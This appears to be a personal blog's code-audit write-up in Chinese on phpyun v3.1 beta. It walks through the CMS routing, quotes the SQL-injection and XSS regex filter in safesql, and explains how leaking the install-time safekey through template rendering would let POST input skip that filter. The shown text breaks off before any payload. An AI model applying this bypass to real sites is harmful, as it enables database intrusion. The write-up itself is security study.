@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="phpyun v3.1 beta代码审计练习" />
+    <meta name="hexo-theme-A4" content="v1.8.8" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>Hexo</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #212425;
+            color: white; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #000000;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #000000;
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Hexo</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            phpyun v3.1 beta代码审计练习
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90"><span class="post-toc-text">路由分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#waf-1"><span class="post-toc-text">waf 1</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#waf-2"><span class="post-toc-text">waf 2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="post-toc-text">sql注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%B3%A8%E5%85%A5%E4%B8%80"><span class="post-toc-text">注入一</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BA%8C"><span class="post-toc-text">注入二</span></a></li></ol></li></ol>
+            
+        
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote>
+<p>phpyunv3.1 beta</p>
+<p>绕sql防御，宽字节注入</p>
+<p>iconv(“utf-8”,”gbk”,$s)对character_set_client&#x3D;binary和影响</p>
+</blockquote>
+<h2 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* *</span></span><br><span class="line"><span class="comment">* $Author ：PHPYUN开发团队</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* 官网: http://www.phpyun.com</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* 版权所有 2009-2014 宿迁鑫潮信息技术有限公司，并保留所有权利。</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* 软件声明：未经授权前提下，不得用于商业运营、二次开发以及任何形式的再次发布。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">include</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&quot;/global.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$config</span>[<span class="string">&#x27;webcache&#x27;</span>]==<span class="string">&quot;1&quot;</span>)&#123;</span><br><span class="line">	<span class="keyword">include_once</span>(LIB_PATH.<span class="string">&quot;web.cache.php&quot;</span>);</span><br><span class="line">	<span class="variable">$cache</span>=<span class="keyword">new</span> <span class="title class_">Phpyun_Cache</span>(<span class="string">&#x27;./cache&#x27;</span>,<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&quot;/&quot;</span>,<span class="variable">$config</span>[<span class="string">&#x27;webcachetime&#x27;</span>]);</span><br><span class="line">	<span class="variable">$cache</span>-&gt;<span class="title function_ invoke__">read_cache</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$var</span>=@<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;-&#x27;</span>,<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;yunurl&#x27;</span>]));</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$var</span> <span class="keyword">as</span> <span class="variable">$p</span>)&#123;</span><br><span class="line">	<span class="variable">$param</span>=@<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;_&#x27;</span>,<span class="variable">$p</span>);</span><br><span class="line">	<span class="variable">$_GET</span>[<span class="variable">$param</span>[<span class="number">0</span>]]=<span class="variable">$param</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yunurl&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>] &amp;&amp; !<span class="title function_ invoke__">ereg</span>(<span class="string">&quot;^[0-9a-zA-Z\_]*$&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>]))&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>] = <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$model</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$model</span>==<span class="string">&quot;&quot;</span>)	<span class="variable">$model</span>=<span class="string">&quot;index&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&quot;&quot;</span>)	<span class="variable">$action</span> = <span class="string">&quot;index&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_file</span>(MODEL_PATH.<span class="variable">$model</span>.<span class="string">&#x27;.class.php&#x27;</span>))&#123;</span><br><span class="line">	<span class="variable">$controller</span>=<span class="string">&#x27;index&#x27;</span>;</span><br><span class="line">	<span class="variable">$action</span>=<span class="string">&#x27;index&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">require</span>(MODEL_PATH.<span class="string">&#x27;class/common.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;model/&quot;</span>.<span class="variable">$model</span>.<span class="string">&#x27;.class.php&#x27;</span>);</span><br><span class="line"><span class="variable">$conclass</span>=<span class="variable">$model</span>.<span class="string">&#x27;_controller&#x27;</span>;</span><br><span class="line"><span class="variable">$actfunc</span>=<span class="variable">$action</span>.<span class="string">&#x27;_action&#x27;</span>;</span><br><span class="line"><span class="variable">$views</span>=<span class="keyword">new</span> <span class="variable">$conclass</span>(<span class="variable">$phpyun</span>,<span class="variable">$db</span>,<span class="variable">$db_config</span>[<span class="string">&quot;def&quot;</span>],<span class="string">&quot;index&quot;</span>,<span class="variable">$model</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">method_exists</span>(<span class="variable">$views</span>,<span class="variable">$actfunc</span>))&#123;</span><br><span class="line">	<span class="variable">$views</span>-&gt;<span class="title function_ invoke__">DoException</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$views</span>-&gt;<span class="variable">$actfunc</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$config</span>[<span class="string">&#x27;webcache&#x27;</span>]==<span class="string">&quot;1&quot;</span>)&#123;</span><br><span class="line">	<span class="variable">$cache</span>-&gt;<span class="title function_ invoke__">CacheCreate</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的路由还是比较简单，都是从这里当做入口</p>
+<p>取m的值作为要实例化的类，c作为需要调用的方法</p>
+<p>url例子：<code>http://192.168.91.39:8082/index.php?m=com&amp;c=search&amp;job1=35</code></p>
+<h2 id="waf-1"><a href="#waf-1" class="headerlink" title="waf 1"></a>waf 1</h2><p>在包含的<code>global.php</code>文件里，引入了<code>db.safety.php</code>和<code>webscan360/360safe/360webscan.php</code>两个sql注入waf</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401161834365.png" title="image-20240116183438291" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401161834365.png" alt="image-20240116183438291"></a></p>
+<p><code>global.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$config</span>[<span class="string">&#x27;sy_istemplate&#x27;</span>]!=<span class="string">&#x27;1&#x27;</span> || <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$config</span>[<span class="string">&#x27;sy_safekey&#x27;</span>]).<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>])!=<span class="variable">$_POST</span>[<span class="string">&#x27;safekey&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$_POST</span>  <span class="keyword">as</span> <span class="variable">$id</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">		<span class="title function_ invoke__">safesql</span>(<span class="variable">$id</span>,<span class="variable">$v</span>,<span class="string">&quot;POST&quot;</span>,<span class="variable">$config</span>);</span><br><span class="line">		<span class="variable">$id</span> = <span class="title function_ invoke__">sfkeyword</span>(<span class="variable">$id</span>,<span class="variable">$config</span>);</span><br><span class="line">		<span class="variable">$v</span> = <span class="title function_ invoke__">sfkeyword</span>(<span class="variable">$v</span>,<span class="variable">$config</span>);</span><br><span class="line">		<span class="variable">$_POST</span>[<span class="variable">$id</span>]=<span class="title function_ invoke__">common_htmlspecialchars</span>(<span class="variable">$v</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里对sql注入进行防御的函数为<code>safesql</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safesql</span>(<span class="params"><span class="variable">$StrFiltKey</span>,<span class="variable">$StrFiltValue</span>,<span class="variable">$type</span></span>)</span>&#123;</span><br><span class="line">	</span><br><span class="line">	 <span class="variable">$getfilter</span> = <span class="string">&quot;\\&lt;.+javascript:window\\[.&#123;1&#125;\\\\x|&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*(data|src)=data:text\\/html.*&gt;|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\\(\d+?|sleep\s*?\\([\d\.]+?\\)|load_file\s*?\\()|&lt;[a-z]+?\\b[^&gt;]*?\\bon([a-z]&#123;4,&#125;)\s*?=|^\\+\\/v(8|9)|\\b(and|or)\\b\\s*?([\\(\\)&#x27;\&quot;\\d]+?=[\\(\\)&#x27;\&quot;\\d]+?|[\\(\\)&#x27;\&quot;a-zA-Z]+?=[\\(\\)&#x27;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#x27;])|\\/\\*.+?\\*\\/|\\/\\*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\\(.+\\)|\\s+?.+?)|UPDATE(\\(.+\\)|\\s+?.+?)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?)FROM(\\(.+\\)|\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$postfilter</span> = <span class="string">&quot;&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*data=data:text\\/html.*&gt;|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\\(\d+?|sleep\s*?\\([\d\.]+?\\)|load_file\s*?\\()|&lt;[^&gt;]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b|\\b(and|or)\\b\\s*?([\\(\\)&#x27;\&quot;\\d]+?=[\\(\\)&#x27;\&quot;\\d]+?|[\\(\\)&#x27;\&quot;a-zA-Z]+?=[\\(\\)&#x27;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#x27;])|\\/\\*.+?\\*\\/|\\/\\*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\\(.+\\)|\\s+?.+?)|UPDATE(\\(.+\\)|\\s+?.+?)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?)FROM(\\(.+\\)|\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$cookiefilter</span> = <span class="string">&quot;benchmark\s*?\\(\d+?|sleep\s*?\\([\d\.]+?\\)|load_file\s*?\\(|\\b(and|or)\\b\\s*?([\\(\\)&#x27;\&quot;\\d]+?=[\\(\\)&#x27;\&quot;\\d]+?|[\\(\\)&#x27;\&quot;a-zA-Z]+?=[\\(\\)&#x27;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#x27;])|\\/\\*.+?\\*\\/|\\/\\*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\\(.+\\)|\\s+?.+?)|UPDATE(\\(.+\\)|\\s+?.+?)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?)FROM(\\(.+\\)|\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$type</span>==<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$ArrFiltReq</span> = <span class="variable">$getfilter</span>;</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">elseif</span>(<span class="variable">$type</span>==<span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="variable">$ArrFiltReq</span> = <span class="variable">$postfilter</span>;</span><br><span class="line">	</span><br><span class="line">	&#125;<span class="keyword">elseif</span>(<span class="variable">$type</span>==<span class="string">&quot;COOKIE&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$ArrFiltReq</span> = <span class="variable">$cookiefilter</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$StrFiltValue</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$StrFiltValue</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="title function_ invoke__">safesql</span>(<span class="variable">$key</span>,<span class="variable">$value</span>,<span class="variable">$type</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$ArrFiltReq</span>.<span class="string">&quot;/is&quot;</span>,<span class="title function_ invoke__">html_entity_decode</span>(<span class="variable">$StrFiltValue</span>,ENT_NOQUOTES,<span class="string">&quot;GB2312&quot;</span>))==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			 <span class="keyword">exit</span>(<span class="title function_ invoke__">safe_pape</span>());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$ArrFiltReq</span>.<span class="string">&quot;/is&quot;</span>,<span class="variable">$StrFiltKey</span>)==<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		 <span class="keyword">exit</span>(<span class="title function_ invoke__">safe_pape</span>());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要不进入这个if语句，就能绕过这个waf，然后再POST传参里进行sql注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$config</span>[<span class="string">&#x27;sy_istemplate&#x27;</span>]!=<span class="string">&#x27;1&#x27;</span> || <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$config</span>[<span class="string">&#x27;sy_safekey&#x27;</span>]).<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>])!=<span class="variable">$_POST</span>[<span class="string">&#x27;safekey&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162007991.png" title="image-20240116200738950" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162007991.png" alt="image-20240116200738950"></a></p>
+<p>这里<code>$config[&#39;sy_istemplate&#39;]</code>的值为1，是config里定义的，不可控的</p>
+<p>所以只要满足<code>md5(md5($config[&#39;sy_safekey&#39;]).$_GET[&#39;m&#39;])==$_POST[&#39;safekey&#39;]</code>即可</p>
+<p><code>$config[&#39;sy_safekey&#39;]</code>的值是在安装的时候随机生成的字符串，所以也是不可控的。现在的任务就是如何从用户层面获得这个值。</p>
+<p>全局搜索，发现除了在<code>plus/config.php</code>文件中存在，还可以通过模板渲染出来</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162011435.png" title="image-20240116201110232" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162011435.png" alt="image-20240116201110232"></a></p>
+<p>这套代码用了smarty作为模板渲染引擎</p>
+<p>在<code>global.php</code>里会创建smarty对象，并进行初始化操作</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phpyun</span> = <span class="keyword">new</span> <span class="title function_ invoke__">smarty</span>();</span><br><span class="line"><span class="variable">$phpyun</span>-&gt;template_dir = APP_PATH.<span class="string">&#x27;/template/&#x27;</span>;</span><br><span class="line"><span class="variable">$phpyun</span>-&gt;compile_dir  = APP_PATH.<span class="string">&#x27;/templates_c/&#x27;</span>;</span><br><span class="line"><span class="variable">$phpyun</span>-&gt;cache_dir    = APP_PATH.<span class="string">&#x27;/cache/&#x27;</span>;</span><br><span class="line"><span class="variable">$phpyun</span>-&gt;left_delimiter = <span class="string">&quot;&#123;yun:&#125;&quot;</span>;</span><br><span class="line"><span class="variable">$phpyun</span>-&gt;right_delimiter = <span class="string">&quot;&#123;/yun&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>smarty比较常用的几个方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">smarty</span>()-&gt;<span class="title function_ invoke__">assign</span>(<span class="variable">$tpl_var</span>, <span class="variable">$value</span> = <span class="literal">null</span>)<span class="comment">//给变量名绑定值</span></span><br><span class="line"><span class="title function_ invoke__">smarty</span>()-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$resource_name</span>, <span class="variable">$cache_id</span> = <span class="literal">null</span>, <span class="variable">$compile_id</span> = <span class="literal">null</span>)<span class="comment">//渲染特定的文件，并将值打印出来</span></span><br></pre></td></tr></table></figure>
+
+<p>在<code>index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span>(MODEL_PATH.<span class="string">&#x27;class/common.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;model/&quot;</span>.<span class="variable">$model</span>.<span class="string">&#x27;.class.php&#x27;</span>);</span><br><span class="line"><span class="variable">$conclass</span>=<span class="variable">$model</span>.<span class="string">&#x27;_controller&#x27;</span>;</span><br><span class="line"><span class="variable">$actfunc</span>=<span class="variable">$action</span>.<span class="string">&#x27;_action&#x27;</span>;</span><br><span class="line"><span class="variable">$views</span>=<span class="keyword">new</span> <span class="variable">$conclass</span>(<span class="variable">$phpyun</span>,<span class="variable">$db</span>,<span class="variable">$db_config</span>[<span class="string">&quot;def&quot;</span>],<span class="string">&quot;index&quot;</span>,<span class="variable">$model</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>$model.&#39;_controller&#39;</code>类大多数是继承了common类，所以在实例化的时候，都会先执行common类里的common函数</p>
+<p>在<code>common::common($tpl,$db,$def=&quot;&quot;,$model=&quot;index&quot;,$m=&quot;&quot;)</code>里，就有对smarty对象进行操作</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162028775.png" title="image-20240116202850617" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162028775.png" alt="image-20240116202850617"></a></p>
+<p>跟进yunset，他就是进行变量绑定的操作</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">yunset</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;tpl-&gt;<span class="title function_ invoke__">assign</span>(<span class="variable">$name</span>,<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
